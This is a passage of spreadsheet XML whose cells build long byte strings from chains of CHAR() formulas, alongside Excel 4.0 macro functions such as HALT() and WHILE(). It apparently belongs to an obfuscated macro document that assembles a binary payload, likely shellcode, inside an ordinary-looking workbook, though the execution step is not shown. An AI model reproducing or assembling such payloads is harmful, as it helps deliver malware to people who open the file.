;CHAR(124)&amp;CHAR(215)&amp;CHAR(100)&amp;CHAR(166)&amp;CHAR(53)&amp;CHAR(70)&amp;CHAR(132)&amp;CHAR(4)&amp;CHAR(128)&amp;CHAR(73)&amp;CHAR(21)&amp;CHAR(154)&amp;CHAR(81)&amp;CHAR(20)&amp;CHAR(28)&amp;CHAR(177)&amp;CHAR(187)&amp;CHAR(99)&amp;CHAR(196)&amp;CHAR(20)&amp;CHAR(218)&amp;CHAR(139)&amp;CHAR(110)&amp;CHAR(137)&amp;CHAR(76)&amp;CHAR(202)&amp;CHAR(213)&amp;CHAR(125)&amp;CHAR(124)&amp;CHAR(228)&amp;CHAR(210)&amp;CHAR(166)&amp;CHAR(59)&amp;CHAR(190)&amp;CHAR(190)&amp;CHAR(229)&amp;CHAR(197)&amp;CHAR(193)&amp;CHAR(24)&amp;CHAR(41)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(43)&amp;CHAR(59)&amp;CHAR(95)&amp;CHAR(1)&amp;CHAR(143)&amp;CHAR(239)&amp;CHAR(94)&amp;CHAR(208)&amp;CHAR(69)&amp;CHAR(7)&amp;CHAR(47)&amp;CHAR(18)&amp;CHAR(190)&amp;CHAR(233)&amp;CHAR(252)&amp;CHAR(232)&amp;CHAR(177)&amp;CHAR(57)&amp;CHAR(199)&amp;CHAR(90)&amp;CHAR(33)&amp;CHAR(22)&amp;CHAR(158)&amp;CHAR(152)&amp;CHAR(172)&amp;CHAR(64)&amp;CHAR(127)&amp;CHAR(51)&amp;CHAR(206)&amp;CHAR(220)&amp;CHAR(135)&amp;CHAR(1)&amp;CHAR(95)&amp;CHAR(92)&amp;CHAR(21)&amp;CHAR(61)&amp;CHAR(195)&amp;CHAR(47)&amp;CHAR(175)&amp;CHAR(255)&amp;CHAR(229)&amp;CHAR(38)&amp;CHAR(7)&amp;CHAR(119)&amp;CHAR(111)&amp;CHAR(98)&amp;CHAR(124)&amp;CHAR(37)&amp;CHAR(224)&amp;CHAR(122)&amp;CHAR(163)&amp;CHAR(233)&amp;CHAR(217)&amp;CHAR(179)&amp;CHAR(255)&amp;CHAR(32)&amp;CHAR(47)&amp;CHAR(153)&amp;CHAR(210)&amp;CHAR(123)&amp;CHAR(190)&amp;CHAR(16)&amp;CHAR(246)&amp;CHAR(171)&amp;CHAR(115)&amp;CHAR(36)&amp;CHAR(43)&amp;CHAR(215)&amp;CHAR(124)&amp;CHAR(30)&amp;CHAR(216)&amp;CHAR(149)&amp;CHAR(207)&amp;CHAR(35)&amp;CHAR(115)&amp;CHAR(208)&amp;CHAR(240)&amp;CHAR(209)&amp;CHAR(192)&amp;CHAR(246)&amp;CHAR(142)&amp;CHAR(183)&amp;CHAR(68)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(68)&amp;CHAR(191)&amp;CHAR(17)&amp;CHAR(34)&amp;CHAR(53)&amp;CHAR(21)&amp;CHAR(110)&amp;CHAR(102)&amp;CHAR(199)&amp;CHAR(114)&amp;CHAR(11)&amp;CHAR(15)&amp;CHAR(20)&amp;CHAR(246)&amp;CHAR(43)&amp;CHAR(192)&amp;CHAR(181)&amp;CHAR(76)&amp;CHAR(240)&amp;CHAR(188)&amp;CHAR(95)&amp;CHAR(68)&amp;CHAR(113)&amp;CHAR(156)&amp;CHAR(93)&amp;CHAR(233)&amp;CHAR(70)&amp;CHAR(205)&amp;CHAR(255)&amp;CHAR(144)&amp;CHAR(153)&amp;CHAR(159)&amp;CHAR(109)&amp;CHAR(115)&amp;CHAR(142)&amp;CHAR(117)&amp;CHAR(253)&amp;CHAR(137)&amp;CHAR(79)&amp;CHAR(173)&amp;CHAR(207)&amp;CHAR(117)&amp;CHAR(60)&amp;CHAR(30)&amp;CHAR(167)&amp;CHAR(192)&amp;CHAR(47)&amp;CHAR(132)&amp;CHAR(5)&amp;CHAR(103)&amp;CHAR(100)&amp;CHAR(164)&amp;CHAR(43)&amp;CHAR(211)&amp;CHAR(63)&amp;CHAR(155)&amp;CHAR(120)&amp;CHAR(73)&amp;CHAR(224)&amp;CHAR(135)&amp;CHAR(81)&amp;CHAR(80)&amp;CHAR(84)</f>
        <v>F½ºžò._x0013_‹Õy´!óo_x0012_³v7_x0014_Ö¤Rènˆ˜_x0012_lY_x001E__x001A_™
ïÒ´˜vÅp˜ì:_x001D_ƒU,_x0006_5ðr_x000B_Ð+íïj&gt;‡ÄÁã_x0010_‚|×d¦5F„_x0004_€I_x0015_šQ_x0014__x001C_±»cÄ_x0014_Ú‹n‰LÊÕ}|äÒ¦;¾¾åÅÁ_x0018_)×–+;__x0001_ï^ÐE_x0007_/_x0012_¾éüè±9ÇZ!_x0016_ž˜¬@3ÎÜ‡_x0001__\_x0015_=Ã/¯ÿå&amp;_x0007_wob|%àz£éÙ³ÿ /™Ò{¾_x0010_ö«s$+×|_x001E_Ø•Ï#sÐðÑÀöŽ·D_x0005_	D¿_x0011_"5_x0015_nfÇr_x000B__x000F__x0014_ö+ÀµLð¼_Dqœ]éFÍÿ™ŸmsŽuý‰O­Ïu&lt;_x001E_§À/„_x0005_gd¤+Ó?›xIà‡QPT</v>
      </c>
      <c r="C19" t="str">
        <f>CHAR(144)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(192)&amp;CHAR(105)&amp;CHAR(87)&amp;CHAR(123)&amp;CHAR(241)&amp;CHAR(125)</f>
        <v>ôqzÀiW{ñ}</v>
      </c>
    </row>
    <row r="20" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A20" t="b">
        <f>HALT()</f>
        <v>0</v>
      </c>
      <c r="B20" t="str">
        <f>CHAR(85)&amp;CHAR(242)&amp;CHAR(194)&amp;CHAR(103)&amp;CHAR(26)&amp;CHAR(201)&amp;CHAR(141)&amp;CHAR(88)&amp;CHAR(233)&amp;CHAR(246)&amp;CHAR(81)&amp;CHAR(135)&amp;CHAR(204)&amp;CHAR(199)&amp;CHAR(187)&amp;CHAR(26)&amp;CHAR(231)&amp;CHAR(200)&amp;CHAR(141)&amp;CHAR(118)&amp;CHAR(172)&amp;CHAR(77)&amp;CHAR(48)&amp;CHAR(130)&amp;CHAR(206)&amp;CHAR(214)&amp;CHAR(164)&amp;CHAR(241)&amp;CHAR(235)&amp;CHAR(52)&amp;CHAR(111)&amp;CHAR(240)&amp;CHAR(142)&amp;CHAR(148)&amp;CHAR(97)&amp;CHAR(145)&amp;CHAR(65)&amp;CHAR(178)&amp;CHAR(105)&amp;CHAR(65)&amp;CHAR(187)&amp;CHAR(169)&amp;CHAR(201)&amp;CHAR(69)&amp;CHAR(243)&amp;CHAR(122)&amp;CHAR(47)&amp;CHAR(176)&amp;CHAR(30)&amp;CHAR(252)&amp;CHAR(110)&amp;CHAR(5)&amp;CHAR(104)&amp;CHAR(238)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(185)&amp;CHAR(37)&amp;CHAR(165)&amp;CHAR(220)&amp;CHAR(2)&amp;CHAR(97)&amp;CHAR(78)&amp;CHAR(84)&amp;CHAR(176)&amp;CHAR(248)&amp;CHAR(144)&amp;CHAR(199)&amp;CHAR(190)&amp;CHAR(110)&amp;CHAR(69)&amp;CHAR(191)&amp;CHAR(151)&amp;CHAR(135)&amp;CHAR(96)&amp;CHAR(185)&amp;CHAR(76)&amp;CHAR(130)&amp;CHAR(92)&amp;CHAR(165)&amp;CHAR(199)&amp;CHAR(149)&amp;CHAR(40)&amp;CHAR(15)&amp;CHAR(117)&amp;CHAR(197)&amp;CHAR(82)&amp;CHAR(41)&amp;CHAR(68)&amp;CHAR(247)&amp;CHAR(163)&amp;CHAR(112)&amp;CHAR(204)&amp;CHAR(40)&amp;CHAR(85)&amp;CHAR(117)&amp;CHAR(159)&amp;CHAR(180)&amp;CHAR(145)&amp;CHAR(209)&amp;CHAR(52)&amp;CHAR(45)&amp;CHAR(13)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(8)&amp;CHAR(170)&amp;CHAR(48)&amp;CHAR(13)&amp;CHAR(97)&amp;CHAR(254)&amp;CHAR(152)&amp;CHAR(41)&amp;CHAR(148)&amp;CHAR(31)&amp;CHAR(59)&amp;CHAR(237)&amp;CHAR(213)&amp;CHAR(141)&amp;CHAR(17)&amp;CHAR(230)&amp;CHAR(85)&amp;CHAR(234)&amp;CHAR(221)&amp;CHAR(162)&amp;CHAR(246)&amp;CHAR(185)&amp;CHAR(55)&amp;CHAR(216)&amp;CHAR(228)&amp;CHAR(217)&amp;CHAR(105)&amp;CHAR(242)&amp;CHAR(191)&amp;CHAR(81)&amp;CHAR(30)&amp;CHAR(162)&amp;CHAR(160)&amp;CHAR(194)&amp;CHAR(170)&amp;CHAR(101)&amp;CHAR(23)&amp;CHAR(5)&amp;CHAR(161)&amp;CHAR(40)&amp;CHAR(168)&amp;CHAR(200)&amp;CHAR(158)&amp;CHAR(246)&amp;CHAR(117)&amp;CHAR(9)&amp;CHAR(196)&amp;CHAR(36)&amp;CHAR(71)&amp;CHAR(197)&amp;CHAR(248)&amp;CHAR(255)&amp;CHAR(160)&amp;CHAR(59)&amp;CHAR(3)&amp;CHAR(143)&amp;CHAR(5)&amp;CHAR(181)&amp;CHAR(92)&amp;CHAR(52)&amp;CHAR(186)&amp;CHAR(89)&amp;CHAR(86)&amp;CHAR(152)&amp;CHAR(189)&amp;CHAR(41)&amp;CHAR(169)&amp;CHAR(58)&amp;CHAR(22)&amp;CHAR(120)&amp;CHAR(168)&amp;CHAR(144)&amp;CHAR(39)&amp;CHAR(32)&amp;CHAR(169)&amp;CHAR(233)&amp;CHAR(42)&amp;CHAR(131)&amp;CHAR(57)&amp;CHAR(29)&amp;CHAR(62)&amp;CHAR(47)&amp;CHAR(26)&amp;CHAR(104)&amp;CHAR(82)&amp;CHAR(103)&amp;CHAR(210)&amp;CHAR(221)&amp;CHAR(105)&amp;CHAR(189)&amp;CHAR(137)&amp;CHAR(58)&amp;CHAR(49)&amp;CHAR(142)&amp;CHAR(43)&amp;CHAR(209)&amp;CHAR(231)&amp;CHAR(63)&amp;CHAR(60)&amp;CHAR(106)&amp;CHAR(171)&amp;CHAR(224)&amp;CHAR(178)&amp;CHAR(125)&amp;CHAR(192)&amp;CHAR(162)&amp;CHAR(151)&amp;CHAR(165)&amp;CHAR(23)&amp;CHAR(251)&amp;CHAR(166)&amp;CHAR(128)&amp;CHAR(17)&amp;CHAR(11)&amp;CHAR(154)&amp;CHAR(234)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(180)&amp;CHAR(180)&amp;CHAR(216)&amp;CHAR(227)&amp;CHAR(23)&amp;CHAR(131)&amp;CHAR(230)&amp;CHAR(47)&amp;CHAR(123)&amp;CHAR(224)&amp;CHAR(141)&amp;CHAR(87)&amp;CHAR(197)&amp;CHAR(235)&amp;CHAR(128)&amp;CHAR(234)&amp;CHAR(249)&amp;CHAR(226)&amp;CHAR(200)&amp;CHAR(149)&amp;CHAR(83)&amp;CHAR(123)&amp;CHAR(250)&amp;CHAR(70)&amp;CHAR(193)&amp;CHAR(123)&amp;CHAR(16)&amp;CHAR(36)&amp;CHAR(12)&amp;CHAR(74)&amp;CHAR(154)&amp;CHAR(78)</f>
        <v>UòÂg_x001A_ÉXéöQ‡ÌÇ»_x001A_çÈv¬M0‚ÎÖ¤ñë4oðŽ”a‘A²iA»©ÉEóz/°_x001E_ün_x0005_hîü¹%¥Ü_x0002_aNT°øÇ¾nE¿—‡`¹L‚\¥Ç•(_x000F_uÅR)D÷£pÌ(UuŸ´‘Ñ4-_x000D__x0010_J_x0008_ª0_x000D_aþ˜)”_x001F_;íÕ_x0011_æUêÝ¢ö¹7ØäÙiò¿Q_x001E_¢ Âªe_x0017__x0005_¡(¨Èžöu	Ä$GÅøÿ ;_x0003__x0005_µ\4ºYV˜½)©:_x0016_x¨' ©é*ƒ9_x001D_&gt;/_x001A_hRgÒÝi½‰:1Ž+Ñç?&lt;j«à²}À¢—¥_x0017_û¦€_x0011__x000B_šê‚_x000C_´´Øã_x0017_ƒæ/{àWÅë€êùâÈ•S{úFÁ{_x0010_$_x000C_JšN</v>
      </c>
      <c r="C20" t="str">
        <f>CHAR(129)&amp;CHAR(50)&amp;CHAR(5)&amp;CHAR(255)&amp;CHAR(61)&amp;CHAR(93)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(57)&amp;CHAR(247)</f>
        <v>2_x0005_ÿ=]¸ô9÷</v>
      </c>
    </row>
    <row r="21" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A21">
        <v>1342177280</v>
      </c>
      <c r="B21" t="str">
        <f>CHAR(133)&amp;CHAR(250)&amp;CHAR(237)&amp;CHAR(198)&amp;CHAR(80)&amp;CHAR(231)&amp;CHAR(136)&amp;CHAR(166)&amp;CHAR(168)&amp;CHAR(158)&amp;CHAR(63)&amp;CHAR(148)&amp;CHAR(117)&amp;CHAR(204)&amp;CHAR(123)&amp;CHAR(233)&amp;CHAR(116)&amp;CHAR(71)&amp;CHAR(147)&amp;CHAR(13)&amp;CHAR(197)&amp;CHAR(62)&amp;CHAR(65)&amp;CHAR(103)&amp;CHAR(100)&amp;CHAR(222)&amp;CHAR(116)&amp;CHAR(236)&amp;CHAR(235)&amp;CHAR(94)&amp;CHAR(232)&amp;CHAR(221)&amp;CHAR(105)&amp;CHAR(183)&amp;CHAR(3)&amp;CHAR(98)&amp;CHAR(30)&amp;CHAR(161)&amp;CHAR(77)&amp;CHAR(61)&amp;CHAR(15)&amp;CHAR(226)&amp;CHAR(73)&amp;CHAR(48)&amp;CHAR(71)&amp;CHAR(228)&amp;CHAR(255)&amp;CHAR(21)&amp;CHAR(133)&amp;CHAR(17)&amp;CHAR(95)&amp;CHAR(117)&amp;CHAR(46)&amp;CHAR(34)&amp;CHAR(99)&amp;CHAR(89)&amp;CHAR(4)&amp;CHAR(216)&amp;CHAR(120)&amp;CHAR(60)&amp;CHAR(153)&amp;CHAR(12)&amp;CHAR(139)&amp;CHAR(110)&amp;CHAR(225)&amp;CHAR(96)&amp;CHAR(70)&amp;CHAR(134)&amp;CHAR(252)&amp;CHAR(192)&amp;CHAR(187)&amp;CHAR(63)&amp;CHAR(147)&amp;CHAR(201)&amp;CHAR(87)&amp;CHAR(48)&amp;CHAR(151)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(81)&amp;CHAR(16)&amp;CHAR(31)&amp;CHAR(47)&amp;CHAR(231)&amp;CHAR(82)&amp;CHAR(96)&amp;CHAR(99)&amp;CHAR(198)&amp;CHAR(139)&amp;CHAR(43)&amp;CHAR(130)&amp;CHAR(188)&amp;CHAR(250)&amp;CHAR(1)&amp;CHAR(231)&amp;CHAR(138)&amp;CHAR(151)&amp;CHAR(84)&amp;CHAR(91)&amp;CHAR(161)&amp;CHAR(125)&amp;CHAR(212)&amp;CHAR(191)&amp;CHAR(221)&amp;CHAR(30)&amp;CHAR(59)&amp;CHAR(194)&amp;CHAR(14)&amp;CHAR(118)&amp;CHAR(228)&amp;CHAR(169)&amp;CHAR(76)&amp;CHAR(113)&amp;CHAR(8)&amp;CHAR(214)&amp;CHAR(233)&amp;CHAR(27)&amp;CHAR(192)&amp;CHAR(176)&amp;CHAR(230)&amp;CHAR(212)&amp;CHAR(137)&amp;CHAR(97)&amp;CHAR(194)&amp;CHAR(177)&amp;CHAR(44)&amp;CHAR(41)&amp;CHAR(187)&amp;CHAR(206)&amp;CHAR(9)&amp;CHAR(243)&amp;CHAR(165)&amp;CHAR(171)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(219)&amp;CHAR(136)&amp;CHAR(184)&amp;CHAR(176)&amp;CHAR(46)&amp;CHAR(188)&amp;CHAR(95)&amp;CHAR(186)&amp;CHAR(248)&amp;CHAR(187)&amp;CHAR(103)&amp;CHAR(70)&amp;CHAR(99)&amp;CHAR(129)&amp;CHAR(193)&amp;CHAR(151)&amp;CHAR(101)&amp;CHAR(42)&amp;CHAR(161)&amp;CHAR(58)&amp;CHAR(250)&amp;CHAR(251)&amp;CHAR(42)&amp;CHAR(37)&amp;CHAR(76)&amp;CHAR(213)&amp;CHAR(197)&amp;CHAR(117)&amp;CHAR(61)&amp;CHAR(56)&amp;CHAR(73)&amp;CHAR(194)&amp;CHAR(244)&amp;CHAR(19)&amp;CHAR(146)&amp;CHAR(223)&amp;CHAR(110)&amp;CHAR(212)&amp;CHAR(81)&amp;CHAR(180)&amp;CHAR(59)&amp;CHAR(51)&amp;CHAR(22)&amp;CHAR(111)&amp;CHAR(14)&amp;CHAR(206)&amp;CHAR(114)&amp;CHAR(105)&amp;CHAR(61)&amp;CHAR(228)&amp;CHAR(52)&amp;CHAR(38)&amp;CHAR(80)&amp;CHAR(202)&amp;CHAR(230)&amp;CHAR(179)&amp;CHAR(92)&amp;CHAR(248)&amp;CHAR(173)&amp;CHAR(29)&amp;CHAR(248)&amp;CHAR(247)&amp;CHAR(115)&amp;CHAR(191)&amp;CHAR(250)&amp;CHAR(165)&amp;CHAR(222)&amp;CHAR(61)&amp;CHAR(142)&amp;CHAR(215)&amp;CHAR(119)&amp;CHAR(206)&amp;CHAR(235)&amp;CHAR(216)&amp;CHAR(82)&amp;CHAR(244)&amp;CHAR(184)&amp;CHAR(2)&amp;CHAR(58)&amp;CHAR(135)&amp;CHAR(102)&amp;CHAR(92)&amp;CHAR(109)&amp;CHAR(150)&amp;CHAR(245)&amp;CHAR(224)&amp;CHAR(90)&amp;CHAR(116)&amp;CHAR(13)&amp;CHAR(219)&amp;CHAR(182)&amp;CHAR(106)&amp;CHAR(9)&amp;CHAR(152)&amp;CHAR(77)&amp;CHAR(238)&amp;CHAR(50)&amp;CHAR(87)&amp;CHAR(121)&amp;CHAR(103)&amp;CHAR(216)&amp;CHAR(21)&amp;CHAR(220)&amp;CHAR(17)&amp;CHAR(228)&amp;CHAR(88)&amp;CHAR(189)&amp;CHAR(104)&amp;CHAR(218)&amp;CHAR(95)&amp;CHAR(223)&amp;CHAR(129)&amp;CHAR(61)&amp;CHAR(82)&amp;CHAR(2)&amp;CHAR(35)&amp;CHAR(38)&amp;CHAR(93)&amp;CHAR(175)&amp;CHAR(193)</f>
        <v>…úíÆPçˆ¦¨ž?”uÌ{étG“_x000D_Å&gt;AgdÞtìë^èÝi·_x0003_b_x001E_¡M=_x000F_âI0Gäÿ_x0015_…_x0011__u."cY_x0004_Øx&lt;™_x000C_‹ná`F†üÀ»?“ÉW0—A-Q_x0010__x001F_/çR`cÆ‹+‚¼ú_x0001_çŠ—T[¡}Ô¿Ý_x001E_;Â_x000E_vä©Lq_x0008_Öé_x001B_À°æÔ‰aÂ±,)»Î	ó¥«_x0007_
Ûˆ¸°.¼_ºø»gFcÁ—e*¡:úû*%LÕÅu=8IÂô_x0013_’ßnÔQ´;3_x0016_o_x000E_Îri=ä4&amp;PÊæ³\ø­_x001D_ø÷s¿ú¥Þ=Ž×wÎëØRô¸_x0002_:‡f\m–õàZt_x000D_Û¶j	˜Mî2WygØ_x0015_Ü_x0011_äX½hÚ_ß=R_x0002_#&amp;]¯Á</v>
      </c>
      <c r="C21" t="str">
        <f>CHAR(133)&amp;CHAR(115)&amp;CHAR(151)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(28)&amp;CHAR(5)&amp;CHAR(126)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>…s—[¸_x001C__x0005_~ˆê</v>
      </c>
    </row>
    <row r="22" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A22">
        <v>0</v>
      </c>
      <c r="B22" t="str">
        <f>CHAR(241)&amp;CHAR(227)&amp;CHAR(194)&amp;CHAR(223)&amp;CHAR(148)&amp;CHAR(24)&amp;CHAR(145)&amp;CHAR(174)&amp;CHAR(61)&amp;CHAR(150)&amp;CHAR(190)&amp;CHAR(173)&amp;CHAR(116)&amp;CHAR(147)&amp;CHAR(145)&amp;CHAR(140)&amp;CHAR(48)&amp;CHAR(166)&amp;CHAR(120)&amp;CHAR(141)&amp;CHAR(217)&amp;CHAR(15)&amp;CHAR(114)&amp;CHAR(206)&amp;CHAR(132)&amp;CHAR(147)&amp;CHAR(222)&amp;CHAR(7)&amp;CHAR(111)&amp;CHAR(109)&amp;CHAR(212)&amp;CHAR(115)&amp;CHAR(30)&amp;CHAR(235)&amp;CHAR(237)&amp;CHAR(251)&amp;CHAR(108)&amp;CHAR(32)&amp;CHAR(166)&amp;CHAR(200)&amp;CHAR(182)&amp;CHAR(7)&amp;CHAR(158)&amp;CHAR(174)&amp;CHAR(1)&amp;CHAR(122)&amp;CHAR(166)&amp;CHAR(74)&amp;CHAR(3)&amp;CHAR(63)&amp;CHAR(60)&amp;CHAR(68)&amp;CHAR(247)&amp;CHAR(27)&amp;CHAR(180)&amp;CHAR(163)&amp;CHAR(77)&amp;CHAR(11)&amp;CHAR(147)&amp;CHAR(45)&amp;CHAR(33)&amp;CHAR(8)&amp;CHAR(119)&amp;CHAR(214)&amp;CHAR(139)&amp;CHAR(188)&amp;CHAR(229)&amp;CHAR(227)&amp;CHAR(34)&amp;CHAR(66)&amp;CHAR(103)&amp;CHAR(180)&amp;CHAR(43)&amp;CHAR(93)&amp;CHAR(158)&amp;CHAR(78)&amp;CHAR(241)&amp;CHAR(123)&amp;CHAR(64)&amp;CHAR(236)&amp;CHAR(57)&amp;CHAR(184)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(162)&amp;CHAR(237)&amp;CHAR(63)&amp;CHAR(245)&amp;CHAR(64)&amp;CHAR(195)&amp;CHAR(61)&amp;CHAR(121)&amp;CHAR(199)&amp;CHAR(55)&amp;CHAR(5)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(177)&amp;CHAR(57)&amp;CHAR(212)&amp;CHAR(183)&amp;CHAR(144)&amp;CHAR(52)&amp;CHAR(229)&amp;CHAR(204)&amp;CHAR(51)&amp;CHAR(19)&amp;CHAR(239)&amp;CHAR(158)&amp;CHAR(158)&amp;CHAR(71)&amp;CHAR(32)&amp;CHAR(238)&amp;CHAR(128)&amp;CHAR(254)&amp;CHAR(224)&amp;CHAR(122)&amp;CHAR(141)&amp;CHAR(27)&amp;CHAR(234)&amp;CHAR(166)&amp;CHAR(33)&amp;CHAR(147)&amp;CHAR(107)&amp;CHAR(199)&amp;CHAR(51)&amp;CHAR(70)&amp;CHAR(107)&amp;CHAR(77)&amp;CHAR(216)&amp;CHAR(58)&amp;CHAR(33)&amp;CHAR(253)&amp;CHAR(146)&amp;CHAR(226)&amp;CHAR(132)&amp;CHAR(84)&amp;CHAR(186)&amp;CHAR(161)&amp;CHAR(90)&amp;CHAR(96)&amp;CHAR(95)&amp;CHAR(237)&amp;CHAR(102)&amp;CHAR(254)&amp;CHAR(210)&amp;CHAR(18)&amp;CHAR(2)&amp;CHAR(189)&amp;CHAR(83)&amp;CHAR(148)&amp;CHAR(238)&amp;CHAR(95)&amp;CHAR(104)&amp;CHAR(219)&amp;CHAR(230)&amp;CHAR(178)&amp;CHAR(59)&amp;CHAR(111)&amp;CHAR(95)&amp;CHAR(232)&amp;CHAR(62)&amp;CHAR(91)&amp;CHAR(51)&amp;CHAR(116)&amp;CHAR(224)&amp;CHAR(180)&amp;CHAR(209)&amp;CHAR(113)&amp;CHAR(13)&amp;CHAR(136)&amp;CHAR(214)&amp;CHAR(130)&amp;CHAR(162)&amp;CHAR(221)&amp;CHAR(194)&amp;CHAR(150)&amp;CHAR(189)&amp;CHAR(180)&amp;CHAR(1)&amp;CHAR(164)&amp;CHAR(170)&amp;CHAR(113)&amp;CHAR(198)&amp;CHAR(194)&amp;CHAR(109)&amp;CHAR(80)&amp;CHAR(21)&amp;CHAR(132)&amp;CHAR(212)&amp;CHAR(19)&amp;CHAR(76)&amp;CHAR(50)&amp;CHAR(208)&amp;CHAR(41)&amp;CHAR(175)&amp;CHAR(246)&amp;CHAR(223)&amp;CHAR(220)&amp;CHAR(58)&amp;CHAR(91)&amp;CHAR(164)&amp;CHAR(204)&amp;CHAR(140)&amp;CHAR(74)&amp;CHAR(59)&amp;CHAR(80)&amp;CHAR(123)&amp;CHAR(77)&amp;CHAR(245)&amp;CHAR(243)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(119)&amp;CHAR(38)&amp;CHAR(24)&amp;CHAR(247)&amp;CHAR(215)&amp;CHAR(106)&amp;CHAR(212)&amp;CHAR(249)&amp;CHAR(14)&amp;CHAR(98)&amp;CHAR(90)&amp;CHAR(182)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(98)&amp;CHAR(13)&amp;CHAR(238)&amp;CHAR(198)&amp;CHAR(85)&amp;CHAR(254)&amp;CHAR(171)&amp;CHAR(34)&amp;CHAR(212)&amp;CHAR(88)&amp;CHAR(239)&amp;CHAR(92)&amp;CHAR(101)&amp;CHAR(36)&amp;CHAR(37)&amp;CHAR(226)&amp;CHAR(105)&amp;CHAR(186)&amp;CHAR(153)&amp;CHAR(49)&amp;CHAR(209)&amp;CHAR(79)&amp;CHAR(124)&amp;CHAR(143)&amp;CHAR(210)&amp;CHAR(172)&amp;CHAR(3)</f>
        <v>ñãÂß”_x0018_‘®=–¾­t“‘Œ0¦xÙ_x000F_rÎ„“Þ_x0007_omÔs_x001E_ëíûl ¦È¶_x0007_ž®_x0001_z¦J_x0003_?&lt;D÷_x001B_´£M_x000B_“-!_x0008_wÖ‹¼åã"Bg´+]žNñ{@ì9¸_x000D_‚	¢í?õ@Ã=yÇ7_x0005_ü±9Ô·4åÌ3_x0013_ïžžG î€þàz_x001B_ê¦!“kÇ3FkMØ:!ý’â„Tº¡Z`_ífþÒ_x0012__x0002_½S”î_hÛæ²;o_è&gt;[3tà´Ñq_x000D_ˆÖ‚¢ÝÂ–½´_x0001_¤ªqÆÂmP_x0015_„Ô_x0013_L2Ð)¯ößÜ:[¤ÌŒJ;P{MõóÎ&gt;w&amp;_x0018_÷×jÔù_x000E_bZ¶_x000B_
b_x000D_îÆUþ«"ÔXï\e$%âiº™1ÑO|Ò¬_x0003_</v>
      </c>
      <c r="C22" t="str">
        <f>CHAR(217)&amp;CHAR(214)&amp;CHAR(181)&amp;CHAR(95)&amp;CHAR(119)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(143)&amp;CHAR(217)&amp;CHAR(208)</f>
        <v>ÙÖµ_wzˆÙÐ</v>
      </c>
    </row>
    <row r="23" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A23" t="b">
        <f>WHILE(A22=0)</f>
        <v>0</v>
      </c>
      <c r="B23" t="str">
        <f>CHAR(43)&amp;CHAR(64)&amp;CHAR(218)&amp;CHAR(82)&amp;CHAR(11)&amp;CHAR(131)&amp;CHAR(213)&amp;CHAR(169)&amp;CHAR(166)&amp;CHAR(249)&amp;CHAR(152)&amp;CHAR(254)&amp;CHAR(158)&amp;CHAR(209)&amp;CHAR(114)&amp;CHAR(236)&amp;CHAR(71)&amp;CHAR(144)&amp;CHAR(56)&amp;CHAR(121)&amp;CHAR(59)&amp;CHAR(201)&amp;CHAR(91)&amp;CHAR(211)&amp;CHAR(171)&amp;CHAR(18)&amp;CHAR(105)&amp;CHAR(60)&amp;CHAR(125)&amp;CHAR(193)&amp;CHAR(199)&amp;CHAR(186)&amp;CHAR(240)&amp;CHAR(250)&amp;CHAR(172)&amp;CHAR(21)&amp;CHAR(50)&amp;CHAR(39)&amp;CHAR(68)&amp;CHAR(255)&amp;CHAR(93)&amp;CHAR(139)&amp;CHAR(116)&amp;CHAR(96)&amp;CHAR(223)&amp;CHAR(134)&amp;CHAR(91)&amp;CHAR(250)&amp;CHAR(240)&amp;CHAR(222)&amp;CHAR(50)&amp;CHAR(83)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(19)&amp;CHAR(130)&amp;CHAR(138)&amp;CHAR(195)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(136)&amp;CHAR(8)&amp;CHAR(182)&amp;CHAR(94)&amp;CHAR(76)&amp;CHAR(19)&amp;CHAR(201)&amp;CHAR(123)&amp;CHAR(15)&amp;CHAR(238)&amp;CHAR(95)&amp;CHAR(170)&amp;CHAR(73)&amp;CHAR(80)&amp;CHAR(152)&amp;CHAR(2)&amp;CHAR(255)&amp;CHAR(88)&amp;CHAR(212)&amp;CHAR(165)&amp;CHAR(81)&amp;CHAR(128)&amp;CHAR(207)&amp;CHAR(100)&amp;CHAR(11)&amp;CHAR(193)&amp;CHAR(61)&amp;CHAR(79)&amp;CHAR(102)&amp;CHAR(87)&amp;CHAR(64)&amp;CHAR(191)&amp;CHAR(245)&amp;CHAR(30)&amp;CHAR(248)&amp;CHAR(141)&amp;CHAR(31)&amp;CHAR(23)&amp;CHAR(50)&amp;CHAR(239)&amp;CHAR(207)&amp;CHAR(204)&amp;CHAR(230)&amp;CHAR(220)&amp;CHAR(92)&amp;CHAR(176)&amp;CHAR(232)&amp;CHAR(130)&amp;CHAR(98)&amp;CHAR(207)&amp;CHAR(33)&amp;CHAR(218)&amp;CHAR(141)&amp;CHAR(151)&amp;CHAR(134)&amp;CHAR(32)&amp;CHAR(59)&amp;CHAR(33)&amp;CHAR(160)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(76)&amp;CHAR(58)&amp;CHAR(213)&amp;CHAR(110)&amp;CHAR(16)&amp;CHAR(141)&amp;CHAR(39)&amp;CHAR(130)&amp;CHAR(119)&amp;CHAR(230)&amp;CHAR(158)&amp;CHAR(46)&amp;CHAR(215)&amp;CHAR(37)&amp;CHAR(87)&amp;CHAR(224)&amp;CHAR(164)&amp;CHAR(216)&amp;CHAR(32)&amp;CHAR(199)&amp;CHAR(191)&amp;CHAR(91)&amp;CHAR(198)&amp;CHAR(138)&amp